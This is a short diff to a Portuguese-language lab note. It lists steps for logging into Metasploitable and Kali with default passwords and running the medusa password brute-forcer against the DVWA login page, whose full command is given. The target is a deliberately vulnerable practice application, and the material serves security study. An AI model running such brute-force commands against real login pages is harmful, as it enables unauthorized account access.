@@ -1,3 +1,8 @@
+1-  Logar no Metasplote com as senhas padrão
+
+2 - Logar no kaly com as senhas padrão
+
+3 - Executar medusa
 medusa -h <IP> -U users.txt -P pass.txt - M http \
 -m PAGE: '/dvwa/login.php'
 -m FORM: 'username=^USER^&password=^PASS^&Login=Login' \
